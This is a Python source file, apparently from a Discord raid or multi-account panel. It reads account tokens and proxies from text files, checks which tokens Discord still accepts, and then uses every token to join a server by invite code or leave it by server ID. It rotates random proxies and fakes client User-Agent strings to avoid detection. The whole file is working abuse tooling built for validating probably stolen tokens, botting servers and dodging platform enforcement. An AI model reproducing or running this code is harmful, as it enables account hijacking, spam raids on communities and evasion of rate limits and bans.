import os
import requests
import random
import os
import sys
import inspect
currentdir = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
parentdir = os.path.dirname(currentdir)
sys.path.insert(0, parentdir) 
from panel import logo


def load_tokens():
    token_list = []
    with open('tokens.txt', 'r') as f:
        for t in f.read().split('\n'):
            token_list.append(t)
    return token_list

def load_proxies():
    proxies_list = []
    with open('proxies.txt', 'r') as d:
        for p in d.read().split('\n'):
            proxies_list.append(p)
    print(proxies_list)
    return proxies_list

def token_checker(token_list, proxies_list='n'):
    invalid = 0
    valid = 0
    good_tokens = []
    sys.stdout.write('Starting checker...\n\n')
    sys.stdout.flush()
    

    for token in token_list:
        if proxies_list != 'n':
            proxy = random.choice(proxies_list)
            r = requests.get('https://discord.com/api/v9/users/@me/library', headers={"authorization": token, 'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}, proxies={
                    'http': proxy,
                    'https': proxy
                }, timeout=10)
            if r.status_code == 401 or r.status_code == 403:
                invalid += 1
                sys.stdout.write(f'\rValid: {valid} | Invalid: {invalid} | Remaining: {len(token_list) - (valid + invalid)}')
                sys.stdout.flush()
            else:
                valid += 1
                good_tokens.append(token)
                sys.stdout.write(f'\rValid: {valid} | Invalid: {invalid} | Remaining: {len(token_list) - (valid + invalid)}')
                sys.stdout.flush()
        else:
            r = requests.get('https://discord.com/api/v9/users/@me/library', headers={"authorization": token, 'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'})
            if r.status_code == 401 or r.status_code == 403:
                invalid += 1
                sys.stdout.write(f'\rValid: {valid} | Invalid: {invalid} | Remaining: {len(token_list) - (valid + invalid)}')
                sys.stdout.flush()
            else:
                valid += 1
                good_tokens.append(token)
                sys.stdout.write(f'\rValid: {valid} | Invalid: {invalid} | Remaining: {len(token_list) - (valid + invalid)}')
                sys.stdout.flush()

    return good_tokens

def proxy_checker(proxies_list):
    sys.stdout.write('Starting checker...\n\n')
    sys.stdout.flush()
    count = 0
    good = 0
    bad = 0
    good_proxies = []
    for proxy in proxies_list:
        try:
            requests.get('http://www.httpbin.org/ip',proxies = {'https' : proxy, 'http' : proxy} ,timeout = 1)
            good += 1
            good_proxies.append(proxy)
            sys.stdout.write(f'\rGood: {good} | Bad: {bad} | Left: {len(proxies_list) - count}')
            sys.stdout.flush()
        except:
            bad += 1
            sys.stdout.write(f'\rGood: {good} | Bad: {bad} | Left: {len(proxies_list) - count}')
            sys.stdout.flush()

    return good_proxies

def joiner(code, token_list, proxies_list='n'):
    sys.stdout.write(f'Joining with {len(token_list)} accounts...\n\n')
    sys.stdout.flush()
    count = 0
    for token in token_list:
        count += 1
        if proxies_list != 'n':
            proxy = random.choice(proxies_list)
            requests.post(f'https://discord.com/api/v9/invites/{code}', headers = {'Authorization': token}, proxies={
                    'http': proxy,
                    'https': proxy
                }, timeout=10)
        else:
            requests.post(f'https://discord.com/api/v9/invites/{code}', headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'})
        sys.stdout.write(f'\rJoined: {count} | Remaining: {len(token_list) - count}')
        sys.stdout.flush()

def leaver(serverid, token_list, proxies_list='n'):
    sys.stdout.write(f'Leaving with {len(token_list)} accounts...\n\n')
    sys.stdout.flush()
    count = 0
    for token in token_list:
        count += 1
        if proxies_list != 'n':
            proxy = random.choice(proxies_list)
            requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{serverid}', headers = {'Authorization': token}, proxies={
                    'http': proxy,
                    'https': proxy
                }, timeout=10)
        else:
            r2 = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{serverid}', headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'})
        sys.stdout.write(f'\rLeft: {count} | Remaining: {len(token_list) - count}')
        sys.stdout.flush()